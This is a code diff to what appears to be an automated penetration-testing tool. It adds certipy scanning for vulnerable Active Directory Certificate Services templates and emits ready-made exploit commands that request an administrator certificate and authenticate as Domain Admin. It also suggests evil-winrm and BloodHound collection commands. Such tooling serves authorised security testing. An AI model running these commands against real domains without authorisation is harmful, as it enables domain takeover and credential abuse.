@@ -1370,7 +1370,7 @@ TOOL_LIST = [
     'GetUserSPNs.py', 'impacket-GetUserSPNs', 'GetNPUsers.py', 'impacket-GetNPUsers',
     'nmblookup',
     # password cracking (hash identification is built-in; these run the actual crack)
-    'hashcat', 'john',
+    'hashcat', 'john', 'certipy', 'certipy-ad',
 ]
 
 def check_tools():
@@ -3233,9 +3233,34 @@ def run_ad_collect_authed(target, services, outdir, args, tools, loot=None, doma
         elif shutil.which('bloodhound-python'):
             _recommend(loot, f"bloodhound-python -u {user} -p '{pw}' -d {domain} -ns {target} -c All --zip",
                        "map AD attack paths")
+        # AD CS: find vulnerable certificate templates (ESC1-ESC16) via certipy
+        cbin = shutil.which('certipy') or shutil.which('certipy-ad')
+        if cbin:
+            info(f"certipy find (vulnerable ADCS templates) as {user}")
+            _, cout, _ = _run([cbin, 'find', '-u', f'{user}@{domain}', '-p', pw,
+                              '-dc-ip', target, '-vulnerable', '-stdout'], timeout=240)
+            (outdir / 'certipy_find.txt').write_text(cout)
+            escs = sorted(set(re.findall(r'ESC\d+', cout)))
+            if escs:
+                ca = (re.search(r'CA Name\s*:\s*(.+)', cout) or [None, ''])[1].strip()
+                tmpl = (re.search(r'Template Name\s*:\s*(.+)', cout) or [None, ''])[1].strip()
+                good(f"  ADCS VULNERABLE: {', '.join(escs)}  CA={ca} template={tmpl}")
+                if loot:
+                    loot.add('auth_findings', f"ADCS vulnerable: {', '.join(escs)} (CA {ca}, template {tmpl})")
+                    loot.add_step(f"ADCS {escs[0]}: certipy req cert as administrator -> auth -> DA")
+                vulns.append({'port': 636, 'service': 'adcs', 'product': 'AD CS', 'version': '',
+                             'desc': f'AD CS vulnerable to {", ".join(escs)} (template {tmpl}, CA {ca})',
+                             'cve': '',
+                             'exploit': (f"{Path(cbin).name} req -u {user}@{domain} -p '{pw}' -ca '{ca}' "
+                                         f"-template '{tmpl}' -upn administrator@{domain} -dc-ip {target}; "
+                                         f"{Path(cbin).name} auth -pfx administrator.pfx -dc-ip {target}"),
+                             'severity': 'critical'})
     elif has_ldap or has_kerberos:
         _recommend(loot, f"nxc ldap {target} -u <user> -p <pass> --bloodhound -c All",
                    "credentialed AD collection once you have a cred")
+        if shutil.which('certipy') or shutil.which('certipy-ad'):
+            _recommend(loot, f"certipy find -u <user>@{domain or '<domain>'} -p <pass> -dc-ip {target} "
+                       f"-vulnerable -stdout", "enumerate AD CS for ESC1-ESC16 once you have a cred")
 
     if has_winrm:
         _recommend(loot, f"evil-winrm -i {target} -u <user> -p <pass>",
@@ -5577,7 +5602,9 @@ def main():
         return
 
     target = args.target
-    api_key = args.api_key if args.ai else None
+    # A provided Gemini key (flag/env/config) enables AI on its own; --ai also
+    # forces puter.js and AI advisor calls at every phase.
+    api_key = args.api_key or None
     puter_token = args.puter_token if args.ai else None
     if args.ai and args.puter_model:
         global _PUTER_MODEL
